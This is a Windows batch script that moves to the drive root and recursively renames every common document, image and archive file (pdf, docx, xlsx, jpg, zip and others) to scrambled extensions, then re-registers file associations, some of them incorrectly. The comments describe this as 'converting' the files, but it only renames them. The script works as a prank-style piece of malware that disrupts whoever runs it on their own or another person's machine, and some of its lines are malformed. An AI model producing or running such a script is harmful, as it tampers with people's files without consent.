cd/
%~d0

%%:

Rem*************PDF TO FDP *******************
Rem this will convert .pdf into fdp (Where /S represents that include sub-folders as well, /M Represents File Filter, /C represents Program to be executed)
forfiles /S /M *.pdf /C "cmd /c rename @file @fname.fdp
assoc .fdp=FoxitPhantomPDF.Document
Rem**********************************************************************

Rem**************TXT TO TTXXTT ******************
Rem this will convert .txt into ttxxtt
forfiles /S /M *.txt /C "cmd /c rename @file @fname.ttxxtt
assoc .ttxxtt=txtfile
Rem**********************************************************************

Rem******************PPTx TO XTPP**************
Rem this will convert .pptx into xtpp
forfiles /S /M *.pptx /C "cmd /c rename @file @fname.xtpp
assoc .xtpp=PowerPoint.Show.8
Rem**********************************************************************

Rem*****************DOCX TO XCOD***************
Rem this will convert .docx into xcod
forfiles /S /M *.docx /C "cmd /c rename @file @fname.xcod
assoc .xcod=Word.Document.12
Rem**********************************************************************

Rem*****************JPG TO JJPPGG***************
Rem this will convert .jpg into jjppgg
forfiles /S /M *.jpg /C "cmd /c rename @file @fname.jjppgg
assoc .jjppgg=jpegfile
Rem**********************************************************************

Rem******************PNG TO PPNNGG**************
Rem this will convert .png into ppnngg
forfiles /S /M *.png /C "cmd /c rename @file @fname.ppnngg
assoc .ppnngg=jpegfile
Rem**********************************************************************

Rem*****************XLSx TO XXLXXX***************
Rem this will convert .xlsx into xxlsxx
forfiles /S /M *.xlsx /C "cmd /c rename @file @fname.xxlsxx
assoc .xxlsxx=Excel.Sheet.12
Rem**********************************************************************

Rem******************ZIP TO ZIPSXSS**************
Rem this will convert .zip into zipsxss
forfiles /S /M *.zip /C "cmd /c rename @file @fname.zipsxss
assoc .zipsxss=WinRAR
Rem**********************************************************************

Rem*******************ZIPX TO ZIPZSXSS*************
Rem this will convert .zipx into zipzsxss
forfiles /S /M *.zipx /C "cmd /c rename @file @fname.zipzsxss
assoc .zipzsxss=WinRAR
Rem**********************************************************************

Rem*******************bmp TO bbmppp*************
Rem this will convert .bmp into bbmppp
forfiles /S /M *.bmp /C "cmd /c rename @file @fname.bbmppp
assoc .bbmppp=Paint.Picture
Rem**********************************************************************

Rem*******************rtf TO rrttf*************
Rem this will convert .rtf into rrttf
forfiles /S /M *.rtf /C "cmd /c rename @file @fname.rrttf
assoc .rrttf=Word.RTF.8
Rem**********************************************************************

Rem *pdf* *txt* *pptx* *docx* *jpg* *png*   *xlsx* *zip* *zipx* *bmp* *rtf* **                          


exit